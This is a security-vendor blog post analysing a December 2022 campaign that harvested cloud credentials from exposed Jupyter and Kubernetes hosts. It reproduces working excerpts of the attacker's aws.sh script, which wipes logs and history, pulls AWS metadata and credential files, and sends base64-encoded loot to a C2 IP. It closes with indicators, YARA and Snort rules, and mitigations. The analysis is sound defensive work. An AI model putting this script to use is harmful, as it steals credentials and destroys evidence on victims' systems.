---
title: Cloud Cred Harvesting Campaign - Grinch Edition
url: "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
author: Ian Ahl
published: 2022-12-29
source_type: article
source_domain: permiso.io
cleanup_method: llm
---

![Image 28: Ian Ahl](https://permiso.io/hubfs/Permiso_Security_June2023/images/Ian-1.webp)

 Ian Ahl | 29 Dec 2022 


# Cloud Cred Harvesting Campaign - Grinch Edition

![Image 33: Cloud Cred Harvesting Campaign - Grinch Edition](https://permiso.io/hubfs/Permiso_Security_June2023/images/Cloud-Cred-Harvesting-Campaign-Grinch-Edition.webp)

Credits: Wilma Miranda

#### Summary

Attacks during the holidays are more reliable than Santa eating cookies. On December 28, 2022, Permiso Security’s p0 Labs team identified a credential harvesting campaign targeting cloud infrastructure. The majority of the victim system were running public facing Juptyer Notebooks. While this campaign is ongoing, at the time of writing this blog, there are about 50 compromised systems. The initial infection for the compromised systems is not currently known, though we do suspect it is likely related to exploitation of vulnerable web applications.

#### Details

On 2022-12-26 at 20:02 The file `aws.sh` was uploaded and made accessible at the path: `http://45.9.148.221/sh/get/aws.sh`. `aws.sh` is a utility that is meant to harvest credentials from AWS EC2 instances and send those credentials to attacker infrastructure. In this case, harvested credentials are uploaded to an open HTTP directory `http://45.9.148.221/<redacted>/`. This script closely mimics previous TNT scripts that have the same purpose.

Other functions of the `aws.sh` script include:

*   Modifying iptables to allow all the things!

```bash
fwall(){
if type iptables 2>/dev/null 1>/dev/null; then
iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null
iptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null
iptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null
iptables -t nat -F 2>/dev/null 1>/dev/null
iptables -t mangle -F 2>/dev/null 1>/dev/null
iptables -F 2>/dev/null 1>/dev/null
iptables -X 2>/dev/null 1>/dev/null
fi
}
```

*   Setting DNS to use google DNS resolvers

`8.8.8.8`

and

`8.8.4.4`

```bash
dns_opt(){
cat /etc/resolv.conf 2>/dev/null 1>/dev/null | grep "nameserver 8.8.4.4" 2>/dev/null 1>/dev/null || echo "nameserver 8.8.4.4" >> /etc/resolv.conf 2>/dev/null
cat /etc/resolv.conf 2>/dev/null 1>/dev/null | grep "nameserver 8.8.8.8" 2>/dev/null 1>/dev/null || echo "nameserver 8.8.8.8" >> /etc/resolv.conf 2>/dev/null
}
```

*   Cleanup of evidence

```bash
notraces(){
#chattr -i $LOCK_FILE 2>/dev/null 1>/dev/null
#rm -f $LOCK_FILE 2>/dev/null 1>/dev/null
rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null
rm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null
lastlog --clear --user root 2>/dev/null 1>/dev/null
lastlog --clear --user $USER 2>/dev/null 1>/dev/null
echo > /var/log/wtmp 2>/dev/null
echo > /var/log/btmp 2>/dev/null
echo > /var/log/lastlog 2>/dev/null
echo > /var/log/syslog 2>/dev/null
echo > /var/log/auth.log 2>/dev/null

rm -f ~/.bash_history 2>/dev/null 1>/dev/null
touch ~/.bash_history 2>/dev/null 1>/dev/null
chattr +i ~/.bash_history 2>/dev/null 1>/dev/null
history -cw
clear

}
```

*   Harvest AWS creds from metadata service

```bash
get_aws_data(){

AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\0' '\n')
AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\0' '\n')
AWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)

echo -e '\n-------- CREDS FILES -----------------------------------' >> $CSOF

for CREFILE in ${CRED_FILE_NAMES[@]}; do echo "searching for $CREFILE"
find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS 

cat $EDIS 

cat $EDIS >> $CSOF

rm -f $EDIS

done

if [ ! -z "$AWS_INFO" ]; then echo -e '\n-------- INFO ------------------------------------------' >> $CSOF
echo $AWS_INFO | sed 's/,/\n/g' | sed 's/ }//g' | grep 'InstanceProfileId\|InstanceProfileArn' | sed 's# "InstanceProfileArn" : "#InstanceProfileArn : #g' | sed 's# "InstanceProfileId" : "#InstanceProfileId  : #g' |sed 's/"//g' >> $CSOF
fi

if [ ! -z "$AWS_1_EC2" ]; then echo -e '\n-------- EC2 -------------------------------------------' >> $CSOF
echo $AWS_1_EC2 | tr ',' '\n' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | sed 's# "Token" : "#aws configure set aws_session_token #g' | sed 's# "Expiration" : "#\n\nExpiration : #g' | sed 's/"//g' >> $CSOF
fi

if [ ! -z "$AWS_1_IAM_NAME" ]; then
AWS_1_IAM=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/$AWS_1_IAM_NAME | tr '\0' '\n')
if [ ! -z "$AWS_1_IAM" ]; then echo -e '\n-------- IAM -------------------------------------------' >> $CSOF
echo $AWS_1_IAM | sed 's/,/\n/g' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | sed 's# "Token" : "#aws configure set aws_session_token #g' | sed 's# "Expiration" : "#\n\nExpiration : #g' | sed 's/"//g' >> $CSOF
fi
fi

if [ ! -z "$AWS_ACCESS_KEY_ID" ] || [ ! -z "$AWS_SECRET_ACCESS_KEY" ] || [ ! -z "$AWS_SESSION_TOKEN" ] || [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ] || [ ! -z "$AWS_CONFIG_FILE" ] || [ ! -z "$AWS_DEFAULT_REGION" ] || [ ! -z "$AWS_REGION" ] || [ ! -z "$AWS_EC2_METADATA_DISABLED" ] || [ ! -z "$AWS_ROLE_ARN" ] || [ ! -z "$AWS_WEB_IDENTITY_TOKEN_FILE" ] || [ ! -z "$AWS_ROLE_SESSION_NAME" ] || [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] ; then
echo -e '\n-------- ENV DATA --------------------------------------' >> $CSOF

if [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then 
dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  | sed 's/,/\n/g' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | sed 's#"AccessKeyId":"#aws configure set aws_access_key_id #g' | sed 's#"SecretAccessKey":"#aws configure set aws_secret_access_key #g' | sed 's#"Token":"#aws configure set aws_session_token #g'| sed 's#"Expiration":"#\nExpiration:  #g'| sed 's/"//g' >> $CSOF
fi
```

*   Enumerate AWS Info

```bash
if [ ! -z "$AWS_ACCESS_KEY_ID" ]; then echo "AWS_ACCESS_KEY_ID : $AWS_ACCESS_KEY_ID" >> $CSOF ; fi
if [ ! -z "$AWS_SECRET_ACCESS_KEY" ]; then echo "AWS_SECRET_ACCESS_KEY : $AWS_SECRET_ACCESS_KEY" >> $CSOF ; fi
if [ ! -z "$AWS_SESSION_TOKEN" ]; then echo "AWS_SESSION_TOKEN : $AWS_SESSION_TOKEN" >> $CSOF ; fi
if [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ]; then echo "AWS_SHARED_CREDENTIALS_FILE : $AWS_SHARED_CREDENTIALS_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_CONFIG_FILE" ]; then echo "AWS_CONFIG_FILE : $AWS_CONFIG_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_DEFAULT_REGION" ]; then echo "AWS_DEFAULT_REGION : $AWS_DEFAULT_REGION" >> $CSOF ; fi
if [ ! -z "$AWS_REGION" ]; then echo "AWS_REGION : $AWS_REGION" >> $CSOF ; fi
if [ ! -z "$AWS_EC2_METADATA_DISABLED" ]; then echo "AWS_EC2_METADATA_DISABLED : $AWS_EC2_METADATA_DISABLED" >> $CSOF ; fi
if [ ! -z "$AWS_ROLE_ARN" ]; then echo "AWS_ROLE_ARN : $AWS_ROLE_ARN" >> $CSOF ; fi
if [ ! -z "$AWS_WEB_IDENTITY_TOKEN_FILE" ]; then echo "AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_ROLE_SESSION_NAME" ]; then echo "AWS_ROLE_SESSION_NAME : $AWS_ROLE_SESSION_NAME" >> $CSOF ; fi
fi
```

*   Enumerate docker information

```bash
docker ps 2>/dev/null 1>/dev/null
if [[ "$?" = "0" ]]; then 

4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep "AWS\|EC2")

if [ ! -z "$4W5_DOCKER" ]; then echo -e '\n-------- FROM DOCKER ------------------------------------' >> $CSOF
echo $4W5_DOCKER >> $CSOF
fi

fi
```

*   Send collected data to C2

```bash
send_aws_data(){
cat $CSOF
SEND_B64_DATA=$(cat $CSOF | base64 -w 0)
rm -f $CSOF
dload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null

}
```

*   Enumerate other credential information

```bash
ACF=("credentials" "cloud" ".npmrc" \
"credentials.gpg" ".s3cfg" ".passwd-s3fs" "authinfo2" ".s3backer_passwd" ".s3b_config" "s3proxy.conf")

CRED_FILE_NAMES=(\
"credentials" ".s3cfg" ".passwd-s3fs" "authinfo2" ".s3backer_passwd" ".s3b_config" "s3proxy.conf" \
"access_tokens.db" "credentials.db" ".smbclient.conf" ".smbcredentials" ".samba_credentials" \
".pgpass" "secrets" ".boto" ".netrc" ".git-credentials" ".gitconfig" "api_key" "censys.cfg" \
"ngrok.yml" "filezilla.xml" "recentservers.xml" "queue.sqlite3" "servlist.conf" "accounts.xml")
```

The attacker infrastructure also hosts a php utility for accepting the harvested data `hxxp://45.9.148.221/<redacted>/in.php` and an open directory where the output of the harvested victim credentials are located `hxxp://45.9.148.221/<redacted>/` . The files in the open directory following the naming structure: `IP Address “.-.” Date in DD.MM.YYYY “.-.” TIME HH-MM “.-.” .txt`. As an example: `123.123.234.234.-.26.12.2022.-.13-03.-..txt`

At the time of running this the most recent file uploaded was at `2022-12-28 16:23` and the first file uploaded was at `2022-12-26 12:45` a listing of the files and their MD5s is below:

#### Victimology

*   The majority of the victims are running public facing Jupyter Notebooks or Kubenertes

*   While the name of the cred harvesting utility and the functions within are focused on AWS, there were many victims in other hosting platforms (GCP, Microsoft, DigitialOcean, Hetzner, etc)

*   Number of victims so far: 47 // Unique IPs that created output files on the c2

*   Credentials stolen from 19 of the victims

*   At least 21 of the victims are running a publicly accessible Jupyter Notebooks instances

#### Indicators

| Indicator | Type | Notes |
| --- | --- | --- |
| 3e2cddf76334529a14076c3659a68d92 |  |  |
| 01a149c8933be37bed975403d26cfa08dbcc3a2b | Hashes | aws.sh |
| 45.9.148[.]221 | IPv4 | Attacker hosting and harvesting |
| hxxp://45.9.148.221/sh/get/aws.sh | URL | Location of the credential harvesting script, |

```json
rule P0_Hunting_AWS_IMDSv1_3
{
    meta:
        author = "Ian@Permiso.io @TekDefense"
        description = "This rule looks for TeamTNT style shell scripts that are indicative of IMDS abuse."
    strings:
        $imds1 = "http://169.254.169.254/latest/meta-data"
        $misc1 = "/dev/null"
        $hist1 = "HISTSIZE=0"
        $hist2 = "unset HISTFILE"
        $credFiles1 = "s3cfg"
        $credFiles2 = "s3proxy.conf"
        $credFiles3 = "ngrok.yml"
        $dns1 = "nameserver 8.8.8.8"
        $dns2 = "/etc/resolv.conf"
        $cleanUp1 = "rm -f /var/log/syslog"
        $cleanUp2 = "rm -f /var/log/auth.log"
        $cleanUp3 = "lastlog --clear --user root"
        $cleanUp4 = "rm -f ~/.bash_history"
        $cleanUp5 = "chattr +i ~/.bash_history"
        $cleanUp6 = "history -cw"
        $output1 = "-- CREDS FILES --"
        $output2 = "-- INFO --"
        $output3 = "-- EC2 --"
        $output4 = "-- IAM --"
        $output5 = "-- ENV DATA --"
        $output6 = "-- FROM DOCKER --"
        $highFi1 = "echo \"no dubble\""
        $highFi2 = "dload http://45.9.148.221/"
        $highFi3 = ">> $CSOF ; fi"
        $highFi4 = "/tmp/.aws.c2g.lock"

    condition:
        1 of ($highFi*)
        or
        4 of ($output*)
        or
        all of ($cleanUp*)
        or
        all of ($credFiles*)
        or 
        (1 of ($imds*) and 1 of ($misc*) and 1 of ($hist*) and 1 of ($credFiles*) and 1 of ($dns*) and 1 of ($cleanUp*))
        and 
        filesize < 10MB
}
```

```bash
alert tcp any any -> $EXTERNAL_NET $HTTP_PORTS (msg:"GET request for file name aws.sh"; flow:established,to_server; content:"GET"; http_method; content:"/aws.sh"; http_uri; sid:11111;)
```

#### Recommendations

*   Block communication to

`45.9.148[.]221`

*   Ensure you are running

[IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

*   Ensure you are practicing least privilege with EC2 instance credentials.

*   Monitor EC2 instance credentials being utilized outside of EC2 IP space.
